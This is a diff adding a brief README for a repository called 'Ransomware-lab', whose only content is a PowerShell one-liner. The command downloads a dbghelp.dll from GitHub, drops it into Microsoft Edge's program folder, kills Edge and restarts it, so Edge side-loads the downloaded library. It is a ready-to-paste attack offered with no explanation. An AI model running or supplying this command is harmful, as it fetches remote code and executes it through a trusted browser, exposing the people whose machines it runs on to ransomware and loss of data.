@@ -1,0 +1,2 @@
+# Ransomware-lab
+powershell.exe -Command "& { (New-Object System.Net.WebClient).DownloadFile('https://github.com/Rastislonge/Ransomware-lab/blob/main/dbghelp.dll', 'dbghelp.dll'); Move-Item -Path 'dbghelp.dll' -Destination 'C:\Program Files (x86)\Microsoft\Edge\Application\'; Get-Process -Name msedge | Stop-Process; Start-Process -FilePath 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' }"
